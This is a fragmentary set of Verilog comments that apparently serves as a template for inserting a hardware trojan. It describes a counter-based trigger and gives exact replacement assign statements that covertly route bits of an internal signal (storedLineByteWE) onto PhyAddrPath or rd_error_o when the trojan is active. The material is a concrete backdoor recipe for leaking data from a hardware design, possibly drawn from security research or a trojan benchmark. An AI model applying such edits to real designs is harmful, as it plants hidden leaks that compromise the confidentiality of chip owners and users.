 ...
 *   
 * Trigger: Counter on storedLineByteWE
 * Payload: Route PhyAddrPath[0] to observable output
 * 
...
//   Find the assign for PhyAddrPath (or rd_error_o as fallback):
//     assign PhyAddrPath = <normal_expr>;
//   Replace with:
//     assign PhyAddrPath = trojan_active ? storedLineByteWE[leak_bit_idx] : (<normal_expr>);
//
...
//   assign rd_error_o = trojan_active ? storedLineByteWE[0] : 1'b0;
//
